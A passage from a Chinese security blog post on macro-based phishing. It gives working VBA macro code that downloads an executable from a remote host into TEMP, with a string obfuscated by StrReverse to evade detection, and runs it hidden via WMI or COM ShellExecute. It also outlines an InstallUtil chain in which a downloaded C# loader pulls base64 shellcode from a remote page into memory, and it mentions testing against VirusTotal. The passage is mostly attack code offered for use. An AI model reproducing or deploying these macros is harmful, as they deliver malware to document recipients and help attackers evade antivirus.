<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Dim payload As String</span><br><span class="line">Dim namePrefix As String</span><br><span class="line">Dim nameSuffix As String</span><br><span class="line">Dim zzz As String</span><br><span class="line">Dim dollop As Object</span><br><span class="line">Dim dstPath As String</span><br><span class="line">Dim savePath As String</span><br><span class="line"></span><br><span class="line">namePrefix = &quot;AppLaunch-actual&quot;</span><br><span class="line">nameSuffix = &quot;.exe&quot;</span><br><span class="line">payload = &quot;http://192.168.41.4/AppLaunch.exe&quot;</span><br><span class="line"></span><br><span class="line">zzz = payload</span><br><span class="line"></span><br><span class="line">Dim downloadf</span><br><span class="line">Set downloadf = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;)</span><br><span class="line">downloadf.Open &quot;GET&quot;, zzz, False</span><br><span class="line">downloadf.setRequestHeader &quot;Host&quot;, &quot;192.168.41.4&quot;</span><br><span class="line">downloadf.Send</span><br><span class="line">Set dollop = CreateObject(StrReverse(&quot;maertS.bdodA&quot;))</span><br><span class="line">dollop.Type = 1</span><br><span class="line">dollop.Open</span><br><span class="line">dollop.Write downloadf.responseBody</span><br><span class="line">dstPath = Environ$(&quot;TEMP&quot;) &amp; &quot;\&quot; &amp; namePrefix &amp; nameSuffix</span><br><span class="line">savePath = dstPath</span><br><span class="line">dollop.savetofile savePath, 2</span><br></pre></td></tr></table></figure>
<p>替换里面的指定位置的内容即可，然后调用wmi来运行rundll32来运行我们的dll.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Const HIDDEN_WINDOW = 0</span><br><span class="line">strComputer = &quot;.&quot;</span><br><span class="line">abc = &quot;rundll32&quot; &amp; &quot; &quot; &amp; dstPath &amp; &quot;,Start&quot;</span><br><span class="line">strGetObject = (&quot;winmgmts:\\.\root\cimv2&quot;)</span><br><span class="line">Set objWMIService = GetObject(strGetObject)</span><br><span class="line">Set objStartup = objWMIService.Get(&quot;Win32_ProcessStartup&quot;)</span><br><span class="line">Set objConfig = objStartup.SpawnInstance_</span><br><span class="line">objConfig.ShowWindow = HIDDEN_WINDOW</span><br><span class="line">Set objProcess = GetObject(strGetObject &amp; (&quot;:Win32_Process&quot;))</span><br><span class="line">objProcess.Create abc, Null, objConfig, intProcessID</span><br></pre></td></tr></table></figure>
<p>也就是稍微更改之前的代码即可，或者调用com组建进程调用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set obj = GetObject(&quot;new:C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;)</span><br><span class="line">obj.Document.Application.ShellExecute &quot;calc&quot;,Null,&quot;C:\\Windows\\System32&quot;,Null,0</span><br></pre></td></tr></table></figure>
<p>然后测试：</p>
<p><img src="../images/fishing/18.png" alt="image.png"></p>
<p>vt测试：</p>
<p><img src="../images/fishing/19.png" alt="image.png"></p>
<h2 id="调用InstallUtil远程加载上线"><a href="#调用InstallUtil远程加载上线" class="headerlink" title="调用InstallUtil远程加载上线"></a>调用InstallUtil远程加载上线</h2><p>大体流程如下</p>
<p><img src="../images/fishing/20.png" alt="image.png"></p>
<p>word下载一个c#载荷，然后使用函数所寻InstallUtil，并加载第一部分中下载的载荷，该载荷为真正的上线内容，该载荷，加载远程网页上的base64的shellcode到内存，获取会话。</p>
<p>首先，就是第一个问题，如何查找系统的InstallUtil程序，宏代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Function FindInstallUtil() As String</span><br><span class="line">    Dim strPath As String: strPath = Environ(&quot;WINDIR&quot;) &amp; &quot;\\Microsoft.Net\\Framework&quot;</span><br><span class="line">    Dim strKeyword As String: strKeyword = &quot;v2.0&quot;</span><br><span class="line">    Dim strKeyword2 As String: strKeyword2 = &quot;v3.5&quot;</span><br><span class="line">    Dim strKeyword3 As String: strKeyword3 = &quot;v3.0&quot;</span><br><span class="line">    Dim strKeyword4 As String: strKeyword4 = &quot;v4.0&quot;</span><br><span class="line">    Dim objSubFolder As Object</span><br><span class="line">    Dim folders(5) As String</span><br><span class="line">    Dim fpf As String</span><br><span class="line">    Dim oFSO As FileSystemObject</span><br><span class="line">    Dim oFolder As Folder</span><br><span class="line">    i = 0</span><br><span class="line">    With CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">        For Each objSubFolder In .GetFolder(strPath).SubFolders</span><br><span class="line">            If InStr(1, objSubFolder.Name, strKeyword, vbTextCompare) &gt; 0 Or InStr(1, objSubFolder.Name, strKeyword2, vbTextCompare) &gt; 0 Or InStr(1, objSubFolder.Name, strKeyword3, vbTextCompare) &gt; 0 Or InStr(1, objSubFolder.Name, strKeyword4, vbTextCompare) &gt; 0 Then</span><br><span class="line">                folders(i) = objSubFolder.Path</span><br><span class="line">                i = i + 1</span><br><span class="line">            End If</span><br><span class="line">        Next</span><br><span class="line">    End With</span><br><span class="line">        For Each f In folders</span><br><span class="line">            fpf = f &amp; &quot;\InstallUtil.exe&quot;</span><br><span class="line">                If Dir(fpf) &lt;&gt; &quot;&quot; Then</span><br><span class="line">                    FindInstallUtil = fpf</span><br><span class="line">                    GoTo ExitFunc</span><br><span class="line">                End If</span><br><span class="line">        Next</span><br><span class="line">ExitFunc:</span><br><span class="line">  End Function</span><br></pre></td></tr></table></figure>
<p>记得勾选</p>
<p><img src="../images/fishing/21.png" alt="image.png"></p>
<p>然后测试一下我们的宏代码能否找到对应的程序，为了方便起见，这里加上调用与InstallUtil的执行命令，代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Dim result As String</span><br><span class="line">Dim InstallUtil As String</span><br><span class="line"></span><br><span class="line">result = FindInstallUtil()</span><br><span class="line">InstallUtil = result &amp; &quot; /logfile= /LogToConsole=false /U &quot; &amp; &quot;C:\users\abc\desktop\xx.jpg&quot;</span><br><span class="line">MsgBox (InstallUtil)</span><br></pre></td></tr></table></figure>
<p>运行后可正确获得目标位置与我们需要执行的程序加命令行。</p>
<p><img src="../images/fishing/22.png" alt="image.png"></p>
<p>那么下面的问题就是下载我们的程序，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Dim payload As String</span><br><span class="line">Dim namePrefix As String</span><br><span class="line">Dim nameSuffix As String</span><br><span class="line">Dim zzz As String</span><br><span class="line">Dim dollop As Object</span><br><span class="line">Dim dstPath As String</span><br><span class="line">Dim savePath As String</span><br><span class="line"></span><br><span class="line">namePrefix = &quot;AppLaunch-actual&quot;</span><br><span class="line">nameSuffix = &quot;.exe&quot;</span><br><span class="line">payload = &quot;http://192.168.41.4/AppLaunch.exe&quot;</span><br><span class="line"></span><br><span class="line">zzz = payload</span><br><span class="line"></span><br><span class="line">Dim downloadf</span><br><span class="line">Set downloadf = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;)</span><br><span class="line">downloadf.Open &quot;GET&quot;, zzz, False</span><br><span class="line">downloadf.setRequestHeader &quot;Host&quot;, &quot;192.168.41.4&quot;</span><br><span class="line">downloadf.Send</span><br><span class="line">Set dollop = CreateObject(StrReverse(&quot;maertS.bdodA&quot;))</span><br><span class="line">dollop.Type = 1</span><br><span class="line">dollop.Open</span><br><span class="line">dollop.Write downloadf.responseBody</span><br><span class="line">dstPath = Environ$(&quot;TEMP&quot;) &amp; &quot;\&quot; &amp; namePrefix &amp; nameSuffix</span><br><span class="line">savePath = dstPath</span><br><span class="line">dollop.savetofile savePath, 2</span><br></pre></td></tr></table></figure>
<p>还是用我们之前的代码，记得更改里面的内容。这里的jpg文件是我们使用csc编译之后的c#文件。</p>
<p><img src="../images/fishing/23.png" alt="image.png"></p>
<p>这个c#的功能就是读取一个远程地址上的base64密文，然后加载回内存执行。exe转base64可参照下面的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(path, &apos;rb&apos;) as f:  </span><br><span class="line">    data = f.read()</span><br><span class="line">    encodestr = base64.b64encode(data)</span><br></pre></td></tr></table></figure>
<p>添加执行代码测试，发现可以成功执行该代码</p>
<p><img src="../images/fishing/24.png" alt="image.png"></p>
<p>当然创建WScript.Shell的方法，肯定是不行的，我们换一种方法来运行，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Set objWMIService = GetObject(&quot;winmgmts:\\.\root\cimv2&quot;)</span><br><span class="line">Set objStartup = objWMIService.Get(&quot;Win32_ProcessStartup&quot;)</span><br><span class="line">Set objConfig = objStartup.SpawnInstance_</span><br><span class="line">Set objProcess = GetObject(&quot;winmgmts:\\.\root\cimv2:Win32_Process&quot;)</span><br><span class="line">WmiExec = objProcess.Create(targetPath,Null,objConfig,intProcessID)</span><br></pre></td></tr></table></figure>
<h2 id="套娃上线"><a href="#套娃上线" class="headerlink" title="套娃上线"></a>套娃上线</h2><p>注：该方法只是提供思路。</p>
<p>程序在app.any.run的运行进程图如下：</p>
<p><img src="../images/fishing/25.png" alt="image.png"></p>

      
    </div>

    

    
    
    

    <div>
      
        
<div class="my_post_copyright">
  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
  
  <!-- JS库 sweetalert 可修改路径 -->
  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
  <p><span>本文标题:</span><a href="/fishing/">聊聊宏钓鱼</a></p>
  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
  <p><span>发布时间:</span>2020年11月07日 - 22:11</p>
  <p><span>最后更新:</span>2020年11月07日 - 22:11</p>
  <p><span>原始链接:</span><a href="/fishing/" title="聊聊宏钓鱼">https://lengjibo.github.io/fishing/</a>
    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/fishing/"  aria-label="复制成功！"></i></span>
  </p>
  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
</div>
<script> 
    var clipboard = new Clipboard('.fa-clipboard');
    $(".fa-clipboard").click(function(){
      clipboard.on('success', function(){
        swal({   
          title: "",   
          text: '复制成功',
          icon: "success", 
          showConfirmButton: true
          });
    });
    });  
</script>


      
    </div>
    <div>
      
        <div>
    
        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
    
</div>

      
    </div>
    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>Donate</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
        <p>WeChat Pay</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
        <p>Alipay</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/钓鱼/" rel="tag"><i class="fa fa-tag"></i> 钓鱼</a>
          
            <a href="/tags/macro/" rel="tag"><i class="fa fa-tag"></i> macro</a>
          
        </div>
      

      
      
        <div class="post-widgets">
        

        

        
          
          <div class="social_share">
            
               <div>
                 
  <div class="bdsharebuttonbox">
    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
    <a href="#" class="bds_more" data-cmd="more"></a>
    <a class="bds_count" data-cmd="count"></a>
  </div>
  <script>
    window._bd_share_config = {
      "common": {
        "bdText": "",
        "bdMini": "2",
        "bdMiniList": false,
        "bdPic": ""
      },
      "share": {
        "bdSize": "16",
        "bdStyle": "0"
      },
      "image": {
        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
        "viewText": "分享到：",
        "viewSize": "16"
      }
    }
  </script>

<script>
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

               </div>
            
            
          </div>
        
        </div>
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/guopqing/" rel="next" title="国庆国庆">
                <i class="fa fa-chevron-left"></i> 国庆国庆
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/ACLNote/" rel="prev" title="ACL攻防漫谈">
                ACL攻防漫谈 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Daftar Isi
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Ikhtisar
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
                alt="冷逸" />
            
              <p class="site-author-name" itemprop="name">冷逸</p>
              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">123</span>
                    <span class="site-state-item-name">posting</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">19</span>
                    <span class="site-state-item-name">kategori</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">122</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          
            <div class="feed-link motion-element">
              <a href="/../../.deploy_git/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
                  
                </span>
              
                <span class="links-of-author-item">
                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
                  
                </span>
              
            </div>
          
        <div id="music163player">
            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
          </div>
          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sqlmap.wiki/" title="青春's blog" target="_blank">青春's blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#调用powershell"><span class="nav-number">1.</span> <span class="nav-text">调用powershell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程下载二进制并执行"><span class="nav-number">2.</span> <span class="nav-text">远程下载二进制并执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用环境变量解密加载"><span class="nav-number">3.</span> <span class="nav-text">利用环境变量解密加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调用InstallUtil远程加载上线"><span class="nav-number">4.</span> <span class="nav-text">调用InstallUtil远程加载上线</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#套娃上线"><span class="nav-number">5.</span> <span class="nav-text">套娃上线</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2021</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">冷逸</span>

  

  
</div>




  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Tema – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>






        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv" title="Total Visitors">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  

  
    <span class="site-pv" title="Total Views">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>









        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>














  







  
  







  
  
    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
  

  
  
    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
  

  
  
    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
  

  
  
    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
  

  
  
    <script type="text/javascript" src="/lib/three/three.min.js"></script>
  

  
  
    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>



  



  










  





  

  

  

  

  
  

  

  

  

  

  

<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<script type="text/javascript" src="/js/src/love.js"></script>
